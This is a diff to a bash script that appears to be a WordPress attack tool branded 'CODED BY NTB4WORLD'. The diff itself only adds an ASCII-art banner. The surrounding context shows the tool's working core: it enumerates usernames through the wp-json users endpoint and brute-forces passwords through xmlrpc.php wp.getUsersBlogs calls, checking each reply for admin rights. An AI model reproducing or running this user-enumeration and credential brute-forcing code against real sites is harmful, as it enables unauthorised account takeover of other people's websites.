@@ -15,11 +15,25 @@ NOCOLOR="\e[0m"
 PUTIH='\033[1;37m'
 
 #CODE
+header () {
+printf "${RED}
+  ▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
+  ██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
+  ██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
+  ▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
+  .▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
+     ${RED}------------------------------------${NOCOLOR}
+              CODED BY NTB4WORLD
+     ${RED}------------------------------------${NOCOLOR}
+"
+}
+header
 echo "1. Use Username from getUsername"
 echo "2. Use Custom Username"
 read -p "Choose Mode : " mode;
 if [[ $mode -eq 1 ]]; then
 	clear
+	header
 	getUsername(){
 		getUser=$( curl -s "${url}/wp-json/wp/v2/users" )
 		UserName=$( echo $getUser | grep -Po '(?<=slug":")[^"]*' | tail -1)
@@ -68,6 +82,7 @@ if [[ $mode -eq 1 ]]; then
 	    done
 elif [[ $mode -eq 2 ]]; then
 	clear
+	header
 	BForce(){
 		brute=$( curl -s "${url}/xmlrpc.php" --data "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>${UserName}</value></param><param><value>${1}</value></param></params></methodCall>")
 		grep=$( echo $brute | grep -Po '(?<=<member><name>isAdmin<\/name><value><boolean>).*?(?=</)' )
